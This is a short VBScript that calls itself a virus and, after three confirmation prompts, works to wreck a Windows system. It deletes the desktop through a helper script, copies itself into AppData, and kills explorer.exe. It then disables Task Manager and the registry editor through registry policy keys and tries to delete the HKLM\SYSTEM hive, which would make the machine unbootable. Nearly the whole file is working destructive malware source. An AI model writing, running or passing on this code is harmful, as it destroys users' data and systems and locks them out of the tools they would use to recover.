Set shell = CreateObject("Wscript.shell")

Set FSO = CreateObject("Scripting.FileSystemObject")

Warning1 = Msgbox("WARNING: This virus can delete desktop, disable task manager, disable registry editor, delete the whole system, and even make your computer unbootable, Do you want to proceed?", vbYesNo, "WARNING")

If Warning1 = vbYes Then
  
Warning2 = Msgbox("SECOND WARNING: It's too destructive to even be a simple virus, just like Michelangelo, Actually Proceed?", vbYesNo, "SECOND WARNING")

If Warning2 = vbYes Then

Warning3 = Msgbox ("FINAL WARNING: You Sure?", vbYesNo, "SECOND WARNING")

If Warning3 = vbYes Then
Set network = CreateObject("WScript.Network")

user = network.UserName

desktop = shell.SpecialFolders("Desktop")

deleteDesktopFilePath = FSO.GetParentFolderName(WScript.ScriptFullName) & "\help\delDesktop.vbs"

FSO.MoveFile WScript.ScriptFullName, shell.SpecialFolders("AppData") & "blackmale.vbs"

shell.run deleteDesktopFilePath, 0, True

shell.run "taskkill /f /im explorer.exe", 0, True

MsgBox "wait for my beautiful payload " & user & "!!!"

WScript.Sleep 1000

shell.run "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", 0, True

shell.run "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f", 0, True

shell.run "reg delete HKEY_LOCAL_MACHINE\SYSTEM /f", 0, True

shell.run "chrome https://www.google.com/search?q=how+to+escape+virus", 0, True

shell.run "msedge https://www.google.com/search?q=how+to+escape+virus", 0, True

Else
      WScript.Quit
End If
Else
      WScript.Quit
End If
Else
      WScript.Quit
End If
